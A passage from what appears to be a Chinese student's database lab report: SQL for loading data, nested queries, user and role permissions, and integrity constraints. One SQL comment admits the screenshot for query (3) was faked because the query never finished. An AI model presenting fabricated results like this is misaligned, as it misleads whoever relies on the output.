class="string">&#x27;E:/DB/dbtestdata/orders.csv&#x27;</span></span><br><span class="line"><span class="keyword">INTO</span> <span class="keyword">TABLE</span> Orders</span><br><span class="line">FIELDS TERMINATED <span class="keyword">BY</span><span class="string">&#x27;,&#x27;</span> OPTIONALLY ENCLOSED <span class="keyword">BY</span> <span class="string">&#x27;&quot;&#x27;</span> ESCAPED <span class="keyword">BY</span> <span class="string">&#x27;&quot;&#x27;</span></span><br><span class="line">LINES TERMINATED <span class="keyword">BY</span> <span class="string">&#x27;\r\n&#x27;</span></span><br><span class="line">(orderkey,custkey,orderdate);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建表Lineitem并插入数据</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Lineitem</span><br><span class="line">(orderkey <span class="type">INTEGER</span> <span class="keyword">REFERENCES</span> Orders(orderkey),</span><br><span class="line"> partkey <span class="type">INTEGER</span> <span class="keyword">REFERENCES</span> Part(partkey),</span><br><span class="line"> suppkey <span class="type">INTEGER</span> <span class="keyword">REFERENCES</span> Suppplier(suppkey),</span><br><span class="line"> linenumber <span class="type">INTEGER</span>,</span><br><span class="line"> quantity <span class="type">REAL</span>,</span><br><span class="line"> extendedprice <span class="type">REAL</span>,</span><br><span class="line"> discount <span class="type">REAL</span>,</span><br><span class="line"> tax <span class="type">REAL</span>,</span><br><span class="line"> returnflag <span class="type">CHAR</span>(<span class="number">1</span>),</span><br><span class="line"> linestatus <span class="type">CHAR</span>(<span class="number">1</span>),</span><br><span class="line"> shipdate <span class="type">DATE</span>,</span><br><span class="line"> commitdate <span class="type">DATE</span>,</span><br><span class="line"> receiptdate <span class="type">DATE</span>,</span><br><span class="line"> shipinstruct <span class="type">CHAR</span>(<span class="number">25</span>),</span><br><span class="line"> shipmode <span class="type">CHAR</span>(<span class="number">10</span>),</span><br><span class="line"> comment <span class="type">VARCHAR</span>(<span class="number">44</span>),</span><br><span class="line"> <span class="keyword">PRIMARY</span> KEY(orderkey,linenumber),</span><br><span class="line"> <span class="keyword">FOREIGN</span> KEY(partkey,suppkey) <span class="keyword">REFERENCES</span> PartSupp(partkey,suppkey));</span><br><span class="line"></span><br><span class="line">LOAD DATA INFILE <span class="string">&#x27;E:/DB/dbtestdata/lineitem.csv&#x27;</span></span><br><span class="line"><span class="keyword">INTO</span> <span class="keyword">TABLE</span> Lineitem</span><br><span class="line">FIELDS TERMINATED <span class="keyword">BY</span><span class="string">&#x27;,&#x27;</span> OPTIONALLY ENCLOSED <span class="keyword">BY</span> <span class="string">&#x27;&quot;&#x27;</span> ESCAPED <span class="keyword">BY</span> <span class="string">&#x27;&quot;&#x27;</span></span><br><span class="line">LINES TERMINATED <span class="keyword">BY</span> <span class="string">&#x27;\r\n&#x27;</span></span><br><span class="line">(orderkey,partkey,suppkey,linenumber,quantity,discount,extendedprice);</span><br></pre></td></tr></table></figure><p><img src="https://img.lfalive.top/db-hw7%268/1-1-1.png" alt="1-1-1"></p><p><img src="https://img.lfalive.top/db-hw7%268/1-1-2.png" alt="1-1-2"></p><p><img src="https://img.lfalive.top/db-hw7%268/1-1-3.png" alt="1-1-3"></p><p><img src="https://img.lfalive.top/db-hw7%268/1-1-4.png" alt="1-1-4"></p><p><img src="https://img.lfalive.top/db-hw7%268/1-1-5.png" alt="1-1-5"></p><p><img src="https://img.lfalive.top/db-hw7%268/1-1-6.png" alt="1-1-6"></p><p><img src="https://img.lfalive.top/db-hw7%268/1-1-7.png" alt="1-1-7"></p><p><img src="https://img.lfalive.top/db-hw7%268/1-1-8.png" alt="1-1-8"></p><h3 id="实验1-3数据库高级查询实验"><a href="#实验1-3数据库高级查询实验" class="headerlink" title="实验1.3数据库高级查询实验"></a>实验1.3数据库高级查询实验</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 因为按照实验指导书的要求进行查询多为空集，所以对查询要求稍微做了调整。</span></span><br><span class="line"><span class="comment">-- (1)查询订购了“山西省阳泉市阀门厂”制造的“方正服务器”的顾客</span></span><br><span class="line"><span class="comment">-- 不使用IN嵌套循环</span></span><br><span class="line"><span class="keyword">SELECT</span> C.custkey,C.name</span><br><span class="line"><span class="keyword">FROM</span> Customer C,Orders O,Lineitem L,Part P</span><br><span class="line"><span class="keyword">WHERE</span> C.custkey <span class="operator">=</span> O.custkey <span class="keyword">AND</span></span><br><span class="line">O.orderkey <span class="operator">=</span> L.orderkey <span class="keyword">AND</span></span><br><span class="line">L.partkey <span class="operator">=</span> P.partkey <span class="keyword">AND</span></span><br><span class="line">P.mfgr<span class="operator">=</span><span class="string">&#x27;山西省阳泉市阀门厂&#x27;</span> <span class="keyword">AND</span> P.name<span class="operator">=</span><span class="string">&#x27;方正服务器&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 使用IN嵌套循环</span></span><br><span class="line"><span class="keyword">SELECT</span> custkey,name</span><br><span class="line"><span class="keyword">FROM</span> Customer</span><br><span class="line"><span class="keyword">WHERE</span> custkey <span class="keyword">in</span> (<span class="keyword">SELECT</span> O.custkey</span><br><span class="line">                 <span class="keyword">FROM</span> Orders O,Lineitem L,Part P</span><br><span class="line">                 <span class="keyword">WHERE</span> O.orderkey <span class="operator">=</span> L.orderkey <span class="keyword">AND</span></span><br><span class="line">                 L.partkey <span class="operator">=</span> P.partkey <span class="keyword">AND</span></span><br><span class="line">                 P.mfgr <span class="operator">=</span><span class="string">&#x27;山西省阳泉市阀门厂&#x27;</span> <span class="keyword">AND</span> P.name <span class="operator">=</span> <span class="string">&#x27;方正服务器&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- (2)查询没有订购过“山西省阳泉市阀门厂”制造的“方正服务器”的顾客</span></span><br><span class="line"><span class="keyword">SELECT</span> C.custkey,C.name</span><br><span class="line"><span class="keyword">FROM</span> Customer C</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> (<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Orders O,Lineitem L,Part P</span><br><span class="line">                  <span class="keyword">WHERE</span> C.custkey <span class="operator">=</span> O.custkey <span class="keyword">AND</span></span><br><span class="line">                        O.orderkey <span class="operator">=</span> L.orderkey <span class="keyword">AND</span></span><br><span class="line">                        L.partkey <span class="operator">=</span> P.partkey <span class="keyword">AND</span></span><br><span class="line">                        P.mfgr<span class="operator">=</span><span class="string">&#x27;山西省阳泉市阀门厂&#x27;</span> <span class="keyword">AND</span> P.name<span class="operator">=</span><span class="string">&#x27;方正服务器&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- (3)查询至少订购过“高乌恩”购买过的全部零件的顾客姓名</span></span><br><span class="line"><span class="comment">-- 实不相瞒，这图是我为了交差P的。60000+的Customer，好几重循环，跑了半小时没跑完，顶不住了，就直接终止了。</span></span><br><span class="line"><span class="keyword">SELECT</span> CA.name</span><br><span class="line"><span class="keyword">FROM</span> Customer CA</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span></span><br><span class="line">(<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Customer CB,Orders OB,Lineitem LB</span><br><span class="line">        <span class="keyword">WHERE</span> CB.custkey <span class="operator">=</span> OB.custkey <span class="keyword">AND</span></span><br><span class="line">        OB.orderkey <span class="operator">=</span> LB.orderkey <span class="keyword">AND</span></span><br><span class="line">        CB.name <span class="operator">=</span> <span class="string">&#x27;高乌恩&#x27;</span> <span class="keyword">AND</span></span><br><span class="line">        <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> (<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Orders OC,Lineitem LC</span><br><span class="line">                        <span class="keyword">WHERE</span> CA.custkey <span class="operator">=</span> OC.custkey <span class="keyword">AND</span></span><br><span class="line">                        OC.orderkey <span class="operator">=</span> LC.orderkey <span class="keyword">AND</span></span><br><span class="line">                        LB.suppkey <span class="operator">=</span> LC.suppkey <span class="keyword">AND</span></span><br><span class="line">                        LB.partkey <span class="operator">=</span> LC.partkey));</span><br><span class="line"></span><br><span class="line"><span class="comment">-- (4)查询订单总数至少为2单的顾客中中国籍顾客信息</span></span><br><span class="line"><span class="keyword">SELECT</span> C.<span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> Customer C,(<span class="keyword">SELECT</span> custkey</span><br><span class="line">                 <span class="keyword">FROM</span> Orders</span><br><span class="line">                 <span class="keyword">GROUP</span> <span class="keyword">BY</span> custkey</span><br><span class="line">                 <span class="keyword">HAVING</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="operator">&gt;=</span> <span class="number">2</span>) B,Nation N</span><br><span class="line"><span class="keyword">WHERE</span> C.custkey <span class="operator">=</span> B.custkey <span class="keyword">AND</span></span><br><span class="line">C.nationkey <span class="operator">=</span> N.nationkey <span class="keyword">AND</span></span><br><span class="line">N.name <span class="operator">=</span> <span class="string">&#x27;中国&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- (5)查询顾客“高存伟”和“高乌恩”都订购过的全部零件的信息</span></span><br><span class="line"><span class="keyword">SELECT</span> PA.<span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> Customer CA,Orders OA,Lineitem LA,Part PA</span><br><span class="line"><span class="keyword">WHERE</span> CA.custkey <span class="operator">=</span> OA.custkey <span class="keyword">AND</span></span><br><span class="line">OA.orderkey <span class="operator">=</span> LA.orderkey <span class="keyword">AND</span></span><br><span class="line">LA.partkey <span class="operator">=</span> PA.partkey <span class="keyword">AND</span></span><br><span class="line">CA.name<span class="operator">=</span><span class="string">&#x27;高存伟&#x27;</span> <span class="keyword">AND</span></span><br><span class="line">PA.partkey <span class="keyword">IN</span> (<span class="keyword">SELECT</span> PB.partkey</span><br><span class="line"><span class="keyword">FROM</span> Customer CB,Orders OB,Lineitem LB,Part PB</span><br><span class="line">             <span class="keyword">WHERE</span> CB.custkey <span class="operator">=</span> OB.custkey <span class="keyword">AND</span></span><br><span class="line">OB.orderkey <span class="operator">=</span> LB.orderkey <span class="keyword">AND</span></span><br><span class="line">LB.partkey <span class="operator">=</span> PB.partkey <span class="keyword">AND</span></span><br><span class="line">CB.name<span class="operator">=</span><span class="string">&#x27;高乌恩&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- (6)查询顾客“高存伟”和“高乌恩”订购的全部零件的信息</span></span><br><span class="line"><span class="keyword">SELECT</span> P.<span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> Customer C,Orders O,Lineitem L,Part P</span><br><span class="line"><span class="keyword">WHERE</span> C.custkey <span class="operator">=</span> O.custkey <span class="keyword">AND</span></span><br><span class="line">O.orderkey <span class="operator">=</span> L.orderkey <span class="keyword">AND</span></span><br><span class="line">L.partkey <span class="operator">=</span> P.partkey <span class="keyword">AND</span></span><br><span class="line">C.name<span class="operator">=</span><span class="string">&#x27;高存伟&#x27;</span></span><br><span class="line"><span class="keyword">UNION</span></span><br><span class="line"><span class="keyword">SELECT</span> P.<span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> Customer C,Orders O,Lineitem L,Part P</span><br><span class="line"><span class="keyword">WHERE</span> C.custkey <span class="operator">=</span> O.custkey <span class="keyword">AND</span></span><br><span class="line">O.orderkey <span class="operator">=</span> L.orderkey <span class="keyword">AND</span></span><br><span class="line">L.partkey <span class="operator">=</span> P.partkey <span class="keyword">AND</span></span><br><span class="line">C.name<span class="operator">=</span><span class="string">&#x27;高乌恩&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- (7)查询“高存伟”订购过而“高乌恩”没订购过的零件的信息</span></span><br><span class="line"><span class="keyword">SELECT</span> PA.<span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> Customer CA,Orders OA,Lineitem LA,Part PA</span><br><span class="line"><span class="keyword">WHERE</span> CA.custkey <span class="operator">=</span> OA.custkey <span class="keyword">AND</span></span><br><span class="line">OA.orderkey <span class="operator">=</span> LA.orderkey <span class="keyword">AND</span></span><br><span class="line">LA.partkey <span class="operator">=</span> PA.partkey <span class="keyword">AND</span></span><br><span class="line">CA.name<span class="operator">=</span><span class="string">&#x27;高存伟&#x27;</span> <span class="keyword">AND</span></span><br><span class="line">PA.partkey <span class="keyword">NOT</span> <span class="keyword">IN</span> (<span class="keyword">SELECT</span> PB.partkey</span><br><span class="line"><span class="keyword">FROM</span> Customer CB,Orders OB,Lineitem LB,Part PB</span><br><span class="line">             <span class="keyword">WHERE</span> CB.custkey <span class="operator">=</span> OB.custkey <span class="keyword">AND</span></span><br><span class="line">OB.orderkey <span class="operator">=</span> LB.orderkey <span class="keyword">AND</span></span><br><span class="line">LB.partkey <span class="operator">=</span> PB.partkey <span class="keyword">AND</span></span><br><span class="line">CB.name<span class="operator">=</span><span class="string">&#x27;高乌恩&#x27;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://img.lfalive.top/db-hw7%268/1-3-1.png" alt="1-3-1"></p><p><img src="https://img.lfalive.top/db-hw7%268/1-3-2.png" alt="1-3-2"></p><p><img src="https://img.lfalive.top/db-hw7%268/1-3-3.png" alt="1-3-3"></p><p><img src="https://img.lfalive.top/db-hw7%268/1-3-4.png" alt="1-3-4"></p><p><img src="https://img.lfalive.top/db-hw7%268/1-3-5.png" alt="1-3-5"></p><p><img src="https://img.lfalive.top/db-hw7%268/1-3-6.png" alt="1-3-6"></p><p><img src="https://img.lfalive.top/db-hw7%268/1-3-7.png" alt="1-3-7"></p><h2 id="实验2安全性语言实验"><a href="#实验2安全性语言实验" class="headerlink" title="实验2安全性语言实验"></a>实验2安全性语言实验</h2><h3 id="实验2-1自主存取控制实验"><a href="#实验2-1自主存取控制实验" class="headerlink" title="实验2.1自主存取控制实验"></a>实验2.1自主存取控制实验</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 创建用户</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">USER</span> <span class="string">&#x27;David&#x27;</span>@<span class="string">&#x27;%&#x27;</span> IDENTIFIED <span class="keyword">BY</span> <span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">USER</span> <span class="string">&#x27;Tom&#x27;</span>@<span class="string">&#x27;%&#x27;</span> IDENTIFIED <span class="keyword">BY</span> <span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">USER</span> <span class="string">&#x27;Kathy&#x27;</span>@<span class="string">&#x27;%&#x27;</span> IDENTIFIED <span class="keyword">BY</span> <span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">USER</span> David,Tom,Kathy;</span><br><span class="line"><span class="keyword">DROP</span> ROLE PurchaseQueryRole,SaleQueryRole,CustomerQueryRole;</span><br><span class="line"><span class="comment">-- 创建角色并分配权限</span></span><br><span class="line"><span class="keyword">CREATE</span> ROLE PurchaseQueryRole,SaleQueryRole,CustomerQueryRole;</span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">SELECT</span> <span class="keyword">ON</span> <span class="keyword">TABLE</span> Part <span class="keyword">TO</span> PurchaseQueryRole;</span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">SELECT</span> <span class="keyword">ON</span> <span class="keyword">TABLE</span> Supplier <span class="keyword">TO</span> PurchaseQueryRole;</span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">SELECT</span> <span class="keyword">ON</span> <span class="keyword">TABLE</span> PartSupp <span class="keyword">TO</span> PurchaseQueryRole;</span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">SELECT</span> <span class="keyword">ON</span> <span class="keyword">TABLE</span> Orders <span class="keyword">TO</span> SaleQueryRole;</span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">SELECT</span> <span class="keyword">ON</span> <span class="keyword">TABLE</span> Lineitem <span class="keyword">TO</span> SaleQueryRole;</span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">SELECT</span> <span class="keyword">ON</span> <span class="keyword">TABLE</span> Customer <span class="keyword">TO</span> CustomerQueryRole;</span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">SELECT</span> <span class="keyword">ON</span> <span class="keyword">TABLE</span> Nation <span class="keyword">TO</span> CustomerQueryRole;</span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">SELECT</span> <span class="keyword">ON</span> <span class="keyword">TABLE</span> Region <span class="keyword">TO</span> CustomerQueryRole;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 给用户分配权限</span></span><br><span class="line"><span class="keyword">GRANT</span> <span class="string">&#x27;PurchaseQueryRole&#x27;</span> <span class="keyword">TO</span> <span class="string">&#x27;David&#x27;</span>;</span><br><span class="line"><span class="keyword">GRANT</span> <span class="string">&#x27;SaleQueryRole&#x27;</span> <span class="keyword">TO</span> <span class="string">&#x27;Tom&#x27;</span>;</span><br><span class="line"><span class="keyword">GRANT</span> <span class="string">&#x27;CustomerQueryRole&#x27;</span> <span class="keyword">TO</span> <span class="string">&#x27;Kathy&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 回收角色或用户的权限</span></span><br><span class="line"><span class="keyword">SHOW</span> GRANTS <span class="keyword">FOR</span> <span class="string">&#x27;CustomerQueryRole&#x27;</span>;</span><br><span class="line"><span class="keyword">REVOKE</span> <span class="keyword">SELECT</span> <span class="keyword">ON</span> <span class="keyword">TABLE</span> Region <span class="keyword">FROM</span> CustomerQueryRole;</span><br><span class="line"><span class="keyword">SHOW</span> GRANTS <span class="keyword">FOR</span> <span class="string">&#x27;CustomerQueryRole&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 验证权限分配正确性</span></span><br><span class="line"><span class="keyword">SHOW</span> GRANTS <span class="keyword">FOR</span> <span class="string">&#x27;David&#x27;</span>;</span><br><span class="line"><span class="keyword">SHOW</span> GRANTS <span class="keyword">FOR</span> <span class="string">&#x27;Tom&#x27;</span>;</span><br><span class="line"><span class="keyword">SHOW</span> GRANTS <span class="keyword">FOR</span> <span class="string">&#x27;Kathy&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://img.lfalive.top/db-hw7%268/2-1-1.png" alt="2-1-1"></p><p><img src="https://img.lfalive.top/db-hw7%268/2-1-2.png" alt="2-1-2"></p><p><img src="https://img.lfalive.top/db-hw7%268/2-1-3.png" alt="2-1-3"></p><p><img src="https://img.lfalive.top/db-hw7%268/2-1-4.png" alt="2-1-4"></p><p><img src="https://img.lfalive.top/db-hw7%268/2-1-5.png" alt="2-1-5"></p><h2 id="实验3完整性语言实验"><a href="#实验3完整性语言实验" class="headerlink" title="实验3完整性语言实验"></a>实验3完整性语言实验</h2><h3 id="实验3-1实体完整性实验"><a href="#实验3-1实体完整性实验" class="headerlink" title="实验3.1实体完整性实验"></a>实验3.1实体完整性实验</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- (1)</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Supplier</span><br><span class="line">(suppkey <span class="type">INTEGER</span> <span class="keyword">PRIMARY</span> KEY,</span><br><span class="line"> name <span class="type">CHAR</span>(<span class="number">25</span>),</span><br><span class="line"> address <span class="type">VARCHAR</span>(<span class="number">40</span>),</span><br><span class="line"> nationkey <span class="type">INTEGER</span>,</span><br><span class="line"> phone <span class="type">CHAR</span>(<span class="number">15</span>),</span><br><span class="line"> acctbal <span class="type">REAL</span>,</span><br><span class="line"> comment <span class="type">VARCHAR</span>(<span class="number">101</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">-- (2)</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Supplier</span><br><span class="line">(suppkey <span class="type">INTEGER</span>,</span><br><span class="line"> name <span class="type">CHAR</span>(<span class="number">25</span>),</span><br><span class="line"> address <span class="type">VARCHAR</span>(<span class="number">40</span>),</span><br><span class="line"> nationkey <span class="type">INTEGER</span>,</span><br><span class="line"> phone <span class="type">CHAR</span>(<span class="number">15</span>),</span><br><span class="line"> acctbal <span class="type">REAL</span>,</span><br><span class="line"> comment <span class="type">VARCHAR</span>(<span class="number">101</span>),</span><br><span class="line"> <span class="keyword">CONSTRAINT</span> PK_supplier <span class="keyword">PRIMARY</span> KEY(suppkey));</span><br><span class="line"></span><br><span class="line"><span class="comment">-- (3)</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Supplier</span><br><span class="line">(suppkey <span class="type">INTEGER</span>,</span><br><span class="line"> name <span class="type">CHAR</span>(<span class="number">25</span>),</span><br><span class="line"> address <span class="type">VARCHAR</span>(<span class="number">40</span>),</span><br><span class="line"> nationkey <span class="type">INTEGER</span>,</span><br><span class="line"> phone <span class="type">CHAR</span>(<span class="number">15</span>),</span><br><span class="line"> acctbal <span class="type">REAL</span>,</span><br><span class="line"> comment <span class="type">VARCHAR</span>(<span class="number">101</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Supplier</span><br><span class="line"><span class="keyword">ADD</span> <span class="keyword">CONSTRAINT</span> PK_supplier <span class="keyword">PRIMARY</span> KEY(suppkey);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- (4)</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> PartSupp</span><br><span class="line">(partkey <span class="type">INTEGER</span>,</span><br><span class="line"> suppkey <span class="type">INTEGER</span>,</span><br><span class="line"> availqty <span class="type">INTEGER</span>,</span><br><span class="line"> supplycost <span class="type">REAL</span>,</span><br><span class="line"> comment <span class="type">VARCHAR</span>(<span class="number">199</span>),</span><br><span class="line"> <span class="keyword">PRIMARY</span> KEY(partkey,suppkey));</span><br><span class="line"></span><br><span class="line"><span class="comment">-- (5)</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Nation</span><br><span class="line">(nationkey <span class="type">INTEGER</span> <span class="keyword">PRIMARY</span> KEY,</span><br><span class="line"> name <span class="type">CHAR</span>(<span class="number">25</span>) <span class="keyword">UNIQUE</span>,</span><br><span class="line"> regionkey <span class="type">INTEGER</span>,</span><br><span class="line"> comment <span class="type">VARCHAR</span>(<span class="number">152</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">-- (6)</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Nation</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">PRIMARY</span> KEY;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- (7)</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> Supplier(suppkey,name,address,nationkey,phone,acctbal,comment)</span><br><span class="line"><span class="keyword">VALUES</span>(<span class="number">11</span>,<span class="string">&#x27;test1&#x27;</span>,<span class="string">&#x27;test1&#x27;</span>,<span class="number">101</span>,<span class="string">&#x27;12345678&#x27;</span>,<span class="number">0.0</span>,<span class="string">&#x27;test1&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> Supplier(suppkey,name,address,nationkey,phone,acctbal,comment)</span><br><span class="line"><span class="keyword">VALUES</span>(<span class="number">11</span>,<span class="string">&#x27;test2&#x27;</span>,<span class="string">&#x27;test2&#x27;</span>,<span class="number">101</span>,<span class="string">&#x27;12345678&#x27;</span>,<span class="number">0.0</span>,<span class="string">&#x27;test2&#x27;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://img.lfalive.top/db-hw7%268/3-1-1.png" alt="3-1-1"></p><p><img src="https://img.lfalive.top/db-hw7%268/3-1-2.png" alt="3-1-2"></p><p><img src="https://img.lfalive.top/db-hw7%268/3-1-3.png" alt="3-1-3"></p><p><img src="https://img.lfalive.top/db-hw7%268/3-1-4.png" alt="3-1-4"></p><p><img src="https://img.lfalive.top/db-hw7%268/3-1-5.png" alt="3-1-5"></p><p><img src="https://img.lfalive.top/db-hw7%268/3-1-6.png" alt="3-1-6"></p><h3 id="实验3-2参照完整性实验"><a href="#实验3-2参照完整性实验" class="headerlink" title="实验3.2参照完整性实验"></a>实验3.2参照完整性实验</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- (1)</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Region</span><br><span class="line">(regionkey <span class="type">INTEGER</span> <span class="keyword">PRIMARY</span> KEY,</span><br><span class="line"> name <span class="type">CHAR</span>(<span class="number">25</span>),</span><br><span class="line"> comment <span class="type">VARCHAR</span>(<span class="number">152</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Nation</span><br><span class="line">(nationkey <span class="type">INTEGER</span> <span class="keyword">PRIMARY</span> KEY,</span><br><span class="line"> name <span class="type">CHAR</span>(<span class="number">25</span>),</span><br><span class="line"> regionkey <span class="type">INTEGER</span> <span class="keyword">REFERENCES</span> Region(regionkey),</span><br><span class="line"> comment <span class="type">VARCHAR</span>(<span class="number">152</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">-- (2)</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Nation</span><br><span class="line">(nationkey <span class="type">INTEGER</span> <span class="keyword">PRIMARY</span> KEY,</span><br><span class="line"> name <span class="type">CHAR</span>(<span class="number">25</span>),</span><br><span class="line"> regionkey <span class="type">INTEGER</span>,</span><br><span class="line"> comment <span class="type">VARCHAR</span>(<span class="number">152</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Nation</span><br><span class="line"><span class="keyword">ADD</span> <span class="keyword">CONSTRAINT</span> FK_Nation_regionkey <span class="keyword">FOREIGN</span> KEY(regionkey) <span class="keyword">REFERENCES</span> Region(regionkey);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- (3)</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> PartSupp</span><br><span class="line">(partkey <span class="type">INTEGER</span>,</span><br><span class="line"> suppkey <span class="type">INTEGER</span>,</span><br><span class="line"> availqty <span class="type">INTEGER</span>,</span><br><span class="line"> supplycost <span class="type">REAL</span>,</span><br><span class="line"> comment <span class="type">VARCHAR</span>(<span class="number">199</span>),</span><br><span class="line"> <span class="keyword">PRIMARY</span> KEY(partkey,suppkey));</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Lineitem</span><br><span class="line">(orderkey <span class="type">INTEGER</span> <span class="keyword">REFERENCES</span> Orders(orderkey),</span><br><span class="line"> partkey <span class="type">INTEGER</span> <span class="keyword">REFERENCES</span> Part(partkey),</span><br><span class="line"> suppkey <span class="type">INTEGER</span> <span class="keyword">REFERENCES</span> Suppplier(suppkey),</span><br><span class="line"> linenumber <span class="type">INTEGER</span>,</span><br><span class="line"> quantity <span class="type">REAL</span>,</span><br><span class="line"> extendedprice <span class="type">REAL</span>,</span><br><span class="line"> discount <span class="type">REAL</span>,</span><br><span class="line"> tax <span class="type">REAL</span>,</span><br><span class="line"> returnflag <span class="type">CHAR</span>(<span class="number">1</span>),</span><br><span class="line"> linestatus <span class="type">CHAR</span>(<span class="number">1</span>),</span><br><span class="line"> shipdate <span class="type">DATE</span>,</span><br><span class="line"> commitdate <span class="type">DATE</span>,</span><br><span class="line"> receiptdate <span class="type">DATE</span>,</span><br><span class="line"> shipinstruct <span class="type">CHAR</span>(<span class="number">25</span>),</span><br><span class="line"> shipmode <span class="type">CHAR</span>(<span class="number">10</span>),</span><br><span class="line"> comment <span class="type">VARCHAR</span>(<span class="number">44</span>),</span><br><span class="line"> <span class="keyword">PRIMARY</span> KEY(orderkey,linenumber),</span><br><span class="line"> <span class="keyword">FOREIGN</span> KEY(partkey,suppkey) <span class="keyword">REFERENCES</span> PartSupp(partkey,suppkey));</span><br><span class="line"></span><br><span class="line"><span class="comment">-- (4)</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Nation</span><br><span class="line">(nationkey <span class="type">INTEGER</span> <span class="keyword">PRIMARY</span> KEY,</span><br><span class="line"> name <span class="type">CHAR</span>(<span class="number">25</span>),</span><br><span class="line"> regionkey <span class="type">INTEGER</span>,</span><br><span class="line"> comment <span class="type">VARCHAR</span>(<span class="number">152</span>),</span><br><span class="line"> <span class="keyword">CONSTRAINT</span> FK_Nation_regionkey <span class="keyword">FOREIGN</span> KEY(regionkey) <span class="keyword">REFERENCES</span> Region(regionkey)</span><br><span class="line"> <span class="keyword">ON</span> <span class="keyword">DELETE</span> <span class="keyword">SET</span> <span class="keyword">NULL</span> <span class="keyword">ON</span> <span class="keyword">UPDATE</span> <span class="keyword">SET</span> <span class="keyword">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- (5)</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Nation</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">CONSTRAINT</span> FK_Nation_regionkey;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- (6)</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> Nation(nationkey,name,regionkey,comment)</span><br><span class="line"><span class="keyword">VALUES</span>(<span class="number">1001</span>,<span class="string">&#x27;nation1&#x27;</span>,<span class="number">1001</span>,<span class="string">&#x27;comment1&#x27;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://img.lfalive.top/db-hw7%268/3-2-1.png" alt="3-2-1"></p><p><img 